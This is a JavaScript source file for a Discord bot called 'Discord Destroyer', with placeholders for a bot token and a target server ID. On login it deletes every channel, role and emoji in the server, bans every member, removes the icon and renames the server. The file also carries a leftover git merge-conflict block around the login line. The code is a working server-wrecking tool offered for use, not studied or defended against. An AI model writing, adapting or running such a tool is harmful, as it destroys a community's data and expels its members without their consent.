const Discord = require("discord.js");
const client = new Discord.Client();
const packageVersion = require("./package.json").version;
const settings = {
    botToken: "YOUR TOKEN ID HERE",
    guildID: "YOUR GUILD ID HERE",
    guildName: "NAME YOU WANT GUILD TO BE RENAMED TO"
};

console.log(`\x1b[44mINFO\x1b[0m: Starting Discord Destroyer, Version: ${packageVersion}`);

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
    const guild = client.guilds.find("id", settings.guildID);
    guild.channels.forEach(c => {
        c.delete();
        console.log(`\x1b[44mINFO\x1b[0m: Deleted channel ${c.name}; ID: ${c.id}`);
    });
    guild.roles.forEach(r => {
        r.delete();
        console.log(`\x1b[44mINFO\x1b[0m: Deleted role ${r.name}; ID: ${r.id}`);
    });
    guild.emojis.forEach(e => {
        guild.deleteEmoji(e);
        console.log(`\x1b[44mINFO\x1b[0m: Deleted emoji ${e.name}; ID: ${e.id}`);
    });
    guild.members.forEach(m => {
        m.ban();
        console.log(`\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}`);
    });
    guild.setIcon(null);
    guild.setName(settings.guildName);
});

<<<<<<< Updated upstream
client.login(settings.botToken);
=======
client.login(settings.botToken);
>>>>>>> Stashed changes
